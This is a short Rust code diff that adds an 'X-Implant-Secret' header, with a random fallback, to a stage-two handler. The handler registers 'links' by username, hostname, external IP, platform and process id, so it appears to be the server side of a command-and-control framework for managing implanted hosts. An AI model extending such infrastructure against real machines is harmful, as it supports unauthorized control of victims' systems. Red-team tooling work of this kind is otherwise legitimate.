@@ -160,6 +160,17 @@ pub async fn stage2_handler(
     let platform = truncate_field(body.platform.clone(), 64);
 
     let mut links = data.links.lock().unwrap_or_else(|e| e.into_inner());
+    // Extract the implant secret from the request headers
+    let secret = req
+        .headers()
+        .get("X-Implant-Secret")
+        .and_then(|v| v.to_str().ok())
+        .map(|s| s.to_string())
+        .unwrap_or_else(|| {
+            // Generate a fallback secret if not provided (for backward compatibility)
+            hex::encode(rand::random::<[u8; 32]>())
+        });
+    
     let link = links.add_link(
         username,
         hostname,
@@ -167,6 +178,7 @@ pub async fn stage2_handler(
         external_ip,
         platform,
         body.pid,
+        secret,
     );
 
     let resp = TaskResponse {
